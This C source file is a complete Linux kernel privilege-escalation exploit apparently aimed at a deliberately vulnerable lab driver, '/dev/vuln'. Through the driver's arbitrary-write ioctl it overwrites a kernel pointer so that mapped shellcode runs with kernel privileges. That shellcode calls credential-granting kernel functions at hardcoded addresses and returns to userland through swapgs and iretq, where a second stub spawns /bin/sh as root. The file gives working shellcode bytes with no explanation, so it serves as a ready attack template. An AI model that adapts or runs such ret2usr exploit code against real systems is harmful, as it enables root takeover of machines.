#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

int main (int argc, char **argv){
	/*
xor rdi, rdi
mov rcx, 0xffffffff8107c0a0
call rcx
mov rdi, rax
mov rcx, 0xffffffff8107bd20
call rcx

swapgs

; ss
mov r15, 0x2b
push 0x2b 

; rsp
mov r15, 0xcafe000
push r15

; rflags
mov r15, 0x246
push r15

; cs
mov r15, 0x33
push r15

; rip
mov r15, 0x1234000
push r15

iretq
	*/
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\x49\xC7\xC7\x2B\x00\x00\x00\x6A\x2B\x49\xC7\xC7\x00\xE0\xAF\x0C\x41\x57\x49\xC7\xC7\x46\x02\x00\x00\x41\x57\x49\xC7\xC7\x33\x00\x00\x00\x41\x57\x49\xC7\xC7\x00\x40\x23\x01\x41\x57\x48\xCF";
	char final[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	void *userland_code = mmap((void *)0x1234000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (userland_code == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}
	memcpy(userland_code, final, sizeof(final));

	void *userland_stack = mmap((void *)0xcafe000, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN, -1, 0);
	if (userland_stack == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	open("/dev/vuln", O_RDONLY);

	return 0;
}